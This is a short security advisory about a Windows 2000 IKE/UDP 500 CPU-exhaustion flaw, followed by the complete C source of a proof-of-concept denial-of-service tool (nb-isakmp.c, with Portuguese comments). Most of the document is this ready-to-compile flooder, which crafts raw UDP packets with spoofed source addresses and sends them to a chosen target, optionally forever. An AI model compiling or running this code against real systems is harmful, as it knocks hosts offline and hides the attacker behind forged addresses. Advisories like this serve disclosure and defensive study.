source: http://www.securityfocus.com/bid/3652/info

Internet Protocol Security (IPSec) provides authentication and encryption for IP network traffic. The Internet Key Exchange (IKE) protocol is a management protocol standard which is used with the IPSec standard. IKE contributes to the IPSec standard by providing additional features and by default listens on UDP port 500.



An issue exists in IKE which could cause a Windows 2000 host to stop responding.



Connecting to port 500 and submitting a continuous stream of arbitrary packets, will cause the CPU utilization to spike to approximately 100%.


It should be noted that this vulnerability may be due to an underlying issue with the UDP protocol.


/* Autor         :       Nelson Brito

 * E-mail        :       nelson@SEKURE.ORG ou nelson@WWSECURITY.NET

 * URL           :       http://nelson.wwsecurity.net/

 * Arquivo       :       nb-isakmp.c

 * Vers?o        :       0.3 Alpha

 * Pa?s          :       Brasil

 * Data          :       11/12/2001

 *

 *

 * Descri??o: 

 * Este ? a prova-do-conceito(proof-of-concept) do ataque de nega??o

 * de servi?o(denial of service, a.k.a. DoS) que explora a falha do

 * IKE/ISAKMP(UDP 500) em sistemas Windows 2000.

 *

 * Esta ? a vers?o em C de um c?digo j? lan?ado em PERL(Net::RawIP).

 *

 * Feliz Natal e um Feliz Ano Novo.

 * Merry Christmas and Happy New Year.

 */

#include <stdio.h>

#include <netdb.h>

#include <string.h>

#include <getopt.h>

#include <stdlib.h>

#include <signal.h>

#include <unistd.h>

#include <arpa/inet.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <netinet/in.h>

#include <netinet/ip.h>

#include <netinet/udp.h>



#define ISAKMP_LEN      800

#define IPPORT_ISAKMP   500

#define SEND_MAX        31337





extern char *optarg;

extern int optind;

extern int h_errno;



void usage(char *name){

        printf("\nUse:  %s [options]\n\n", name);

        printf("\t-s, --source*\t\tSource Address to Spoof\n");

        printf("\t-d, --destination*\tDestination Address to Attack\n");

        printf("\t-p, --port\t\tDestination Port to Attack\t(def: %d)\n", IPPORT_ISAKMP);

        printf("\t-n, --number\t\tNumber of Packets to Send\t(def: %d)\n", SEND_MAX);

        printf("\t-l, --length\t\tPackets Length\t\t\t(def: %d)\n", ISAKMP_LEN);

        printf("\t-L, --loop\t\tSend Packets Forever\n");

        printf("\t-h, --help\t\tShow this Message\n\n");

        printf("Copyrigth(c) 2001 Nelson Brito<nelson@SEKURE.ORG>. All rigths reserved.\n");

        exit(0);

}



void u_abort(int s){

        printf("\nnb-isamkp.c: aborted process id %d.\n", getpid());

        printf("Rock my world, baby!\n");

        exit(0);

}



char die(char *message){

        printf("%s\n", message);

        exit(0);

}



/* 

 * Eu j? vi v?rias fun??es que fazem a mesma coisa, por?m nunca de

 * uma forma t?o robusta. Quero ver neguinho pagar pau pros gringos

 * agora. ;-)

 */

u_long getip(char *destination){

        static u_long ip_addr;

        struct hostent *hostname;


        hostname = gethostbyname(destination);

        if(hostname == NULL){

                switch(h_errno){

                        case HOST_NOT_FOUND:

                                die("getip(): the spcified host is unknown."); 

                                break;

                        case NO_ADDRESS|NO_DATA:

                                die("getip(): the requested name is valid but does not have an IP address."); 

                                break;

                        case NO_RECOVERY:

                                die("getip(): a non-recoverable name server error occured."); 

                                break;

                        case TRY_AGAIN:

                                die("getip(): a temporary error occurred on a AUTH NS, try again later."); 

                                break;

                        default: 

                                break;

                }

        }

       memcpy(&ip_addr, hostname->h_addr, hostname->h_length);

        return(ip_addr);        

}



int isakmp_dos(int sock, u_long s_address, u_long d_address, int port, int number, int forever, int length){

        int nbs, 

            i, 

            psize, 

            times = 0, 

            dp,

            iplen  = sizeof(struct iphdr),

            udplen = sizeof(struct udphdr);



        struct sockaddr_in sin;



        struct _packet{

                struct iphdr  ip;

                struct udphdr udp;

                char data[length];

        } nb_pkt;







        sin.sin_family      = AF_INET;

        sin.sin_port        = 1235;

        sin.sin_addr.s_addr = d_address;



        psize = iplen + udplen + length;

        

        memset(&nb_pkt, 0, psize);



        nb_pkt.ip.version  = 4;

        nb_pkt.ip.ihl      = 5;

        nb_pkt.ip.tot_len  = htons(iplen + udplen + length);

        nb_pkt.ip.id       = htons(0xdead);

        nb_pkt.ip.ttl      = 0xff;

        nb_pkt.ip.protocol = IPPROTO_UDP;

        nb_pkt.ip.saddr    = s_address;

        nb_pkt.ip.daddr    = d_address;



        dp = port ? port : IPPORT_ISAKMP;



        nb_pkt.udp.source = htons(dp);

        nb_pkt.udp.dest   = htons(dp);

        nb_pkt.udp.len    = htons(length);

        nb_pkt.udp.check  = htons(0xbeef);



        for(i = 0 ; i < length ; i++)

                nb_pkt.data[i] = 0x2e;



        times = number ? number : SEND_MAX;



        while(times > 0){

                printf(".");

                nbs = sendto(sock, &nb_pkt, psize, 0, (struct sockaddr *) &sin, sizeof(struct sockaddr));

                if(!forever) times--;

        }

        return nbs;

}



int main(int argc, char **argv){

        char *version = "0.4a";

        u_long source, destination;

        int lineopt, 

            port = 0, 

            nb, 

            nbs = 1,

            loop = 0,

            number = 0,

            pkt_len,

            src_ok = 0,

            dst_ok = 0,

            length = 0;



        printf("--- nb-isakmp.c v.%s / Nelson Brito / Independent Security Consultant ---\n", version);



        (argc < 4) ? usage(argv[0]) : (char *)NULL;



        signal(SIGHUP,  SIG_IGN);

        signal(SIGINT,  u_abort);

        signal(SIGTERM, u_abort);

        signal(SIGKILL, u_abort);

        signal(SIGQUIT, u_abort);



        while(1){

                static struct option my_opt[]={

                        {"source",        1, 0, 's'},

                        {"destination",   1, 0, 'd'},

                        {"port",          1, 0, 'p'},

                        {"number",        1, 0, 'n'},

                        {"length",        1, 0, 'l'},

                        {"loop",          0, 0, 'L'},

                        {"help",          0, 0, 'h'},

                        {0,               0, 0, 0}

                };

                int option_index = 0;

                lineopt = getopt_long(argc, argv, "s:d:p:n:l:Lh", my_opt, &option_index);



                if(lineopt == -1) break;



                switch(lineopt){

                        case 's':

                                source = getip(optarg); 

                                src_ok++; 

                                break;

                        case 'd':

                                destination = getip(optarg); 

                                dst_ok++; 

                                break;

                        case 'p':

                                port = atoi(optarg);

                                if((port <= 0) || (port > 65535))

                                        die("main(): port range error.");

                                break;

                        case 'n':

                                number = atoi(optarg); 

                                break;

                        case 'l':

                                length = atoi(optarg); 

                                break;

                        case 'L':

                                loop++; 

                                break;

                        case 'h':

                        default:

                                usage(argv[0]); 

                                break;

                }

        }



        if((!src_ok) && (!dst_ok)) usage(argv[0]);



        if((nb = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))< 0)


                die("main(): socket() error.");

        

        if(setsockopt(nb, IPPROTO_IP, IP_HDRINCL, (char *)&nbs, sizeof(nbs)) < 0)

                die("main(): setsockopt() error.");



        pkt_len = length ? length : ISAKMP_LEN;



        if((isakmp_dos(nb, source, destination, port, number, loop, pkt_len)) == -1)

                die("main(): isakmp_dos() error");



        printf("\nRock my world, baby!\n");

        return(1);

}
  	